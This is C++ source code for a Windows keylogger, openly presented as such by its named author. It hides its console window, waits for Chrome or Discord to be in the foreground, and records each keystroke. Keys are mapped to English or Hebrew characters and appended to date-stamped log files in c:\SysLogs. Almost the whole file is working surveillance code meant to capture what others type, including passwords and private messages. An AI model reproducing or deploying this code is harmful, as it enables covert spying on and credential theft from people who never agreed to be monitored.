/*
|
|
|█ ▄▄  ▄█ █    █▀▄▀█ ▄███▄      ▄   ▄█     █    ████▄   ▄▀    ▄▀  ▄███▄   █▄▄▄▄
|█   █ ██ █    █ █ █ █▀   ▀      █  ██     █    █   █ ▄▀    ▄▀    █▀   ▀  █  ▄▀
|█▀▀▀  ██ █    █ ▄ █ ██▄▄    ██   █ ██     █    █   █ █ ▀▄  █ ▀▄  ██▄▄    █▀▀▌
|█     ▐█ ███▄ █   █ █▄   ▄▀ █ █  █ ▐█     ███▄ ▀████ █   █ █   █ █▄   ▄▀ █  █
| █     ▐     ▀   █  ▀███▀   █  █ █  ▐         ▀       ███   ███  ▀███▀     █
|  ▀             ▀           █   ██                                        ▀
|
| VERSION : 1.0
| FIRST RELEASE
| CREDIT TO : PILMENINA AKA WAHALEZ
|
| THIS PROGRAM IS OPEN-SOURCE, IF YOU USE IT, GIVE CREDIT TO PILMENINA
| 
| THIS PROGRAM CAPTURES CHROME AND DISCORD KEYBOARD DEPENDS ON LANGUAGE
| AND SAVES THE KEYBOARD STROKES TO A FILE UNDER c:\\SysLogs WITH A NEW
| FILE WITH THE CURRENT DATE AND TIME
|
| LANGUAGES ARE CURRENTLY ONLY HEBREW AND ENGLISH, FEEL FREE TO ADD YOUR OWN
|
|
|				***USE THIS PROGRAM AT YOUR OWN RISK***
| THE CREATOR DOES NOT TAKE ANY RESPONSIBILITY FOR ANY HARM DONE BY THIS PROGRAM
|
*/


#define _CRT_SECURE_NO_WARNINGS
#define DEBUG 0

#include <iostream>
#include <windows.h>
#include <string>
#include <tlhelp32.h>
#include <thread>
#include <fstream>
#include <sstream>
#include <time.h>
#include <stdio.h>
#include <Windows.h>
#include <vector>

class Key {
private:
	unsigned char key;
	int count;
public:
	Key(unsigned char key) {
		this->key = key;
	}
	void captureKey() {
		if (GetAsyncKeyState(key) & 0x8000) {
			count++;
		}
		else {
			count = 0;
		}
	}
	bool isPressed() {
		return count == 1;
	}
	bool isDown() {
		return count > 0;
	}
	unsigned char getKey() {
		return this->key;
	}
};

DWORD FindProcessId(LPCTSTR ProcessName);
DWORD FindThreadId(DWORD processID);
void  sendLogToFile(LPCTSTR path, std::string file, unsigned char* unicode);
std::string buildLogFileName();
std::vector<Key*> buildKeys(const unsigned char[], int len);
void captureKeys(std::vector<Key*> keys);
void captureThread(DWORD processID);



enum LANG {
	EN,
	HE,
	UNKNOWN
};

LANG language;
HHOOK _hook;

// processes to capture keyboard on
LPCSTR processChrome = "chrome.exe";
LPCSTR processDiscord = "Discord.exe";

LPCSTR pathName = "c:\\SysLogs";
std::string fileName;

const unsigned char specialCharacters[] = { 0x10 /*VK_SHIFT				  */ ,
											0x11 /*VK_CONTROL			  */ ,
											0x14 /*VK_CAPITAL (CAPS LOCK) */ ,
											0x20 /*VK_SPACE				  */ ,
											0x23 /*VK_END				  */ ,
											0x0D /*VK_RETURN			  */ };

const unsigned char charactersA_Z[] = { 0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,
										0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A };

const unsigned char unusualCharacters[] = { 0xBA	/*VK_OEM_1      (;:)		*/,
											0xBC	/*VK_OEM_COMMA   (,)		*/,
											0xBB    /*VK_OEM_PLUS   (+=)		*/,
											0xBD    /*VK_OEM_MINUS  (-_)		*/,
											0xBE    /*VK_OEM_PERIOD (.)			*/,
											0xBF    /*VK_OEM_2		(/?)		*/ };


const unsigned char characters0_9[] = { 0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39 };

const unsigned char characters_numpad_0_9[] = { 0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69 };

std::vector<Key*> keys_A_to_Z_Vec = buildKeys(charactersA_Z, (sizeof(charactersA_Z) / sizeof(*charactersA_Z)));
std::vector<Key*> specialCharacters_Vec = buildKeys(specialCharacters, (sizeof(specialCharacters) / sizeof(*specialCharacters)));
std::vector<Key*> unusualCharacters_Vec = buildKeys(unusualCharacters, (sizeof(unusualCharacters) / sizeof(*unusualCharacters)));
std::vector<Key*> characters0_9_Vec = buildKeys(characters0_9, (sizeof(characters0_9) / sizeof(*characters0_9)));
std::vector<Key*> characters_numpad_0_9_Vec = buildKeys(characters_numpad_0_9, (sizeof(characters_numpad_0_9) / sizeof(*characters_numpad_0_9)));

int main() {


	// Hide window if not on debug mode
	#if DEBUG == 0
		::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	#else
		::ShowWindow(::GetConsoleWindow(), SW_SHOW);
	#endif // DEBUG



	fileName = buildLogFileName();

	DWORD processID_chrome;
	DWORD processID_discord;

	DWORD lpd = 0;

	while (true) {
		processID_chrome = FindProcessId(processChrome);
		processID_discord = FindProcessId(processDiscord);

		if (processID_chrome == 0 && processID_discord == 0){
			std::cout << "SLEEP" << std::endl;
			std::this_thread::sleep_for(std::chrono::seconds(2));
		}

		// foreground thread id
		GetWindowThreadProcessId(GetForegroundWindow(), &lpd);

		// check if foreground thread has same id like the processes
		if (processID_chrome == lpd) {
			captureThread(processID_chrome);
		}
		else if(processID_discord == lpd) {
			captureThread(processID_chrome);
		}
		else {
			// if non of the processes are in foreground, give the cpu a bit time to RE-LAX :)
			std::this_thread::sleep_for(std::chrono::milliseconds(100));
		}
	}
	lpd = 0;
	return 0;
}
void captureThread(DWORD processID) {
	DWORD threadID;
	HKL currentKBLayout;

	threadID = FindThreadId(processID);

	currentKBLayout = GetKeyboardLayout(threadID);
	
	unsigned int x = (unsigned int)currentKBLayout & 0x000000FF;
	
	if (x == 0x0D) {												// HEBREW
		if (language != HE)
			sendLogToFile(pathName, fileName, (unsigned char*)"\n");
		language = HE;
	}
	else if (x == 0x09) {										    //ENGLISH	
		if (language != EN)
			sendLogToFile(pathName, fileName, (unsigned char*)"\n");
		language = EN;
	}
	else {															//UNKNOWN
		language = UNKNOWN;
		std::this_thread::sleep_for(std::chrono::seconds(2));
	}
	if (language != UNKNOWN) {
		captureKeys(specialCharacters_Vec);
		captureKeys(keys_A_to_Z_Vec);
		captureKeys(unusualCharacters_Vec);
		captureKeys(characters0_9_Vec);
		captureKeys(characters_numpad_0_9_Vec);
	}
}
DWORD FindProcessId(LPCTSTR ProcessName) {
	PROCESSENTRY32 pt;
	HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pt.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hsnap, &pt)) { // must call this first
		do {
			if (!lstrcmpi(pt.szExeFile, ProcessName)) {
				CloseHandle(hsnap);
				return pt.th32ProcessID;
			}
		} while (Process32Next(hsnap, &pt));
	}
	CloseHandle(hsnap); // close handle on failure
	return 0;
}
DWORD FindThreadId(DWORD processID) {
	DWORD threadID;
	DWORD pid;
	HWND h = GetTopWindow(0);
	while (h) {
		threadID = GetWindowThreadProcessId(h, &pid);
		if (pid == processID)
			break;
		h = GetNextWindow(h, GW_HWNDNEXT);
	}
	return threadID;
}
void  sendLogToFile(LPCTSTR path, std::string file, unsigned char* unicode) {
	std::ofstream logOutput;
	if (CreateDirectory(path, NULL) || ERROR_ALREADY_EXISTS == GetLastError()) {
		std::stringstream  fileNameStream;
		fileNameStream << path << "\\" << file;
		std::string fileName = fileNameStream.str();
		logOutput.open(fileName, std::ios::app);
		logOutput << unicode;
		logOutput.close();
	}
	else {
		exit(1);
	}
}
std::string buildLogFileName() {
	time_t rawtime;
	struct tm * timeinfo;
	std::string fileName = "Log-";

	time(&rawtime);
	timeinfo = localtime(&rawtime);

	fileName += std::to_string(timeinfo->tm_mday) + "-";		// day
	fileName += std::to_string(timeinfo->tm_mon + 1) + "-";		// month
	fileName += std::to_string(timeinfo->tm_year + 1900) + "-"; // year
	fileName += std::to_string(timeinfo->tm_hour) + "-";        // hour
	fileName += std::to_string(timeinfo->tm_min) + "-";			// min
	fileName += std::to_string(timeinfo->tm_sec) + ".txt";		// sec

	return fileName;
}

std::vector<Key*> buildKeys(const unsigned char keys[], int len) {
	std::vector<Key*> keysVector;
	Key* temp;
	for (int i = 0; i < len; i++) {
		temp = new Key(keys[i]);
		keysVector.push_back(temp);
	}
	return keysVector;
}

bool capsLock = false;
bool shift = false;

void captureKeys(std::vector<Key*> keys) {
	for (auto key : keys) {
		key->captureKey();
		// -------------------------- SPECIAL CHARACTERS --------------------------
		if (key->getKey() == 0x10) {	// VK_SHIFT
			if (key->isDown()) {
				shift = true;
			}
			else {
				shift = false;
			}
		}
		// -----------------------------------------------------------------------
		//-------------------------- REGULAR CHARACTERS --------------------------
		if (key->isPressed()) {
			std::cout << "PRESSED" << key->getKey() << std::endl;
			switch (key->getKey()) {
			case 0x11:				// VK_CONTROL
				sendLogToFile(pathName, fileName, (unsigned char*)" ");
				sendLogToFile(pathName, fileName, (unsigned char*)"C");
				sendLogToFile(pathName, fileName, (unsigned char*)"T");
				sendLogToFile(pathName, fileName, (unsigned char*)"R");
				sendLogToFile(pathName, fileName, (unsigned char*)"L");
				sendLogToFile(pathName, fileName, (unsigned char*)" ");
				break;
			case 0x14:				// VK_CAPITAL
				capsLock = !capsLock;
				break;
			case 0x20:				// VK_SPACE
				sendLogToFile(pathName, fileName, (unsigned char*)" ");
				break;
			case 0x23:				// END PROGRAM
				exit(0);
				break;
			case 0x30:
				if (!capsLock && !shift)
					sendLogToFile(pathName, fileName, (unsigned char*)"0");
				else
					sendLogToFile(pathName, fileName, (unsigned char*)")");
				break;
			case 0x31:
				if (!capsLock && !shift)
					sendLogToFile(pathName, fileName, (unsigned char*)"1");
				else
					sendLogToFile(pathName, fileName, (unsigned char*)"!");
				break;
			case 0x32:
				if (!capsLock && !shift)
					sendLogToFile(pathName, fileName, (unsigned char*)"2");
				else
					sendLogToFile(pathName, fileName, (unsigned char*)"@");
				break;
			case 0x33:
				if (!capsLock && !shift)
					sendLogToFile(pathName, fileName, (unsigned char*)"3");
				else
					sendLogToFile(pathName, fileName, (unsigned char*)"#");
				break;
			case 0x34:
				if (!capsLock && !shift)
					sendLogToFile(pathName, fileName, (unsigned char*)"4");
				else
					sendLogToFile(pathName, fileName, (unsigned char*)"$");
				break;
			case 0x35:
				if (!capsLock && !shift)
					sendLogToFile(pathName, fileName, (unsigned char*)"5");
				else
					sendLogToFile(pathName, fileName, (unsigned char*)"%");
				break;
			case 0x36:
				if (!capsLock && !shift)
					sendLogToFile(pathName, fileName, (unsigned char*)"6");
				else
					sendLogToFile(pathName, fileName, (unsigned char*)"^");
				break;
			case 0x37:
				if (!capsLock && !shift)
					sendLogToFile(pathName, fileName, (unsigned char*)"7");
				else
					sendLogToFile(pathName, fileName, (unsigned char*)"&");
				break;
			case 0x38:
				if (!capsLock && !shift)
					sendLogToFile(pathName, fileName, (unsigned char*)"8");
				else
					sendLogToFile(pathName, fileName, (unsigned char*)"*");
				break;
			case 0x39:
				if (!capsLock && !shift)
					sendLogToFile(pathName, fileName, (unsigned char*)"9");
				else
					sendLogToFile(pathName, fileName, (unsigned char*)"(");
				break;
			case 0x60:
				sendLogToFile(pathName, fileName, (unsigned char*)"0"); 
				break;
			case 0x61:
				sendLogToFile(pathName, fileName, (unsigned char*)"1");
				break;
			case 0x62:
				sendLogToFile(pathName, fileName, (unsigned char*)"2");
				break;
			case 0x63:
				sendLogToFile(pathName, fileName, (unsigned char*)"3");
				break;
			case 0x64:
				sendLogToFile(pathName, fileName, (unsigned char*)"4");
				break;
			case 0x65:
				sendLogToFile(pathName, fileName, (unsigned char*)"5");
				break;
			case 0x66:
				sendLogToFile(pathName, fileName, (unsigned char*)"6");
				break;
			case 0x67:
				sendLogToFile(pathName, fileName, (unsigned char*)"7");
				break;
			case 0x68:
				sendLogToFile(pathName, fileName, (unsigned char*)"8");
				break;
			case 0x69:
				sendLogToFile(pathName, fileName, (unsigned char*)"9");
				break;
			case 0x0D:
				sendLogToFile(pathName, fileName, (unsigned char*)"\n");
				break;
			case 0x41:				// A
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\xa9");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"A");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"a");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"A");
				}
				break;
			case 0x42:				// B	
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\xa0");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"B");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"b");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"B");
				}
				break;
			case 0x43:				// C
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x91");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"C");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"c");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"C");
				}
				break;
			case 0x44:				// D
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x92");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"D");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"d");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"D");
				}
				break;
			case 0x45:				// E
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\xa7");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"E");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"e");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"E");
				}
				break;
			case 0x46:				// F
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x9b");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"F");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"f");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"F");
				}
				break;
			case 0x47:				// G
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\xa2");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"G");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"g");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"G");
				}
				break;
			case 0x48:				// H
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x99");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"H");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"h");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"H");
				}
				break;
			case 0x49:				// I
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x9f");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"I");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"i");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"I");
				}
				break;
			case 0x4A:				// J
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x97");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"J");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"j");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"J");
				}
				break;
			case 0x4B:				// K
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x9c");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"K");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"k");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"K");
				}
				break;
			case 0x4C:				// L
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x9a");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"L");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"l");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"L");
				}
				break;
			case 0x4D:				// M
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\xa6");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"M");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"m");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"M");
				}
				break;
			case 0x4E:				// N
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x9e");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"N");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"n");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"N");
				}
				break;
			case 0x4F:				// O
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x9d");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"O");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"o");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"O");
				}
				break;
			case 0x50:				// P
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\xa4");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"P");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"p");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"P");
				}
				break;
			case 0x51:				// Q
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"/");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"Q");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"q");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"Q");
				}
				break;
			case 0x52:				// R
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\xa8");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"R");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"r");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"R");
				}
				break;
			case 0x53:				// S
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x93");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"S");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"s");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"S");
				}
				break;
			case 0x54:				// T
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x90");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"T");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"t");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"T");
				}
				break;
			case 0x55:				// U
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x95");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"U");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"u");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"U");
				}
				break;
			case 0x56:				// V
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x94");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"V");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"v");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"V");
				}
				break;
			case 0x57:				// W
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"'");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"W");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"w");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"W");
				}
				break;
			case 0x58:				// X
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\xa1");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"X");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"x");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"X");
				}
				break;
			case 0x59:				// Y
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x98");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"Y");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"y");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"Y");
				}
				break;
			case 0x5A:				// Z
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\x96");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"Z");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"z");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"Z");
				}
				break;
			case 0xBA: // ;:
				if (language == HE) { 
					std::cout << "PLEASE WORK ..."; 
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\xa3");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)":");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)";"); 
					else
						sendLogToFile(pathName, fileName, (unsigned char*)":");
				}
				break;
			case 0xBC:
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\xaa"); 
					else
						sendLogToFile(pathName, fileName, (unsigned char*)">");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)",");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"<");
				}
				break;
			case 0xBE:
				if (language == HE) { 
					if (!capsLock && !shift) 
						sendLogToFile(pathName, fileName, (unsigned char*)"\xd7\xa5");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"<");
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)".");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)">");
				}
				break;
			case 0xBF:
				if (language == HE) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"."); 
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"?"); 
				}
				else if (language == EN) {
					if (!capsLock && !shift)
						sendLogToFile(pathName, fileName, (unsigned char*)"/");
					else
						sendLogToFile(pathName, fileName, (unsigned char*)"?");
				}
				break;
			}
		}
	}
}